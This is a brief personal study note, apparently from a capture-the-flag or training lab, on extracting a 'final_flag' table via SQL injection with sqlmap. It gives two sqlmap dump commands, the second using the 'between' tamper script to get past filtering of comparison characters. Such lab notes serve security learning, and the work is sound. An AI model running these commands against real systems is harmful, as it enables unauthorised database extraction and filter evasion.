#SQL_Injection 

---

- When trying first **sqlmap** with the following command:
```bash
sqlmap -r req.txt --risk 3 -T final_flag --dump
```
I got the following error, seemingly because of special chars `>` `<`, since in this case **sqlmap** was using a **time-based sql injection** attack which uses comparison to check each char one-by-one. To avoid the above issue, I used the following command:
```bash
sqlmap -r req.txt --risk 3 -T final_flag --dump --tamper=between
```

which basically replaces these special characters as described in [[Bypassing Web Application Protections#^9b667b]]

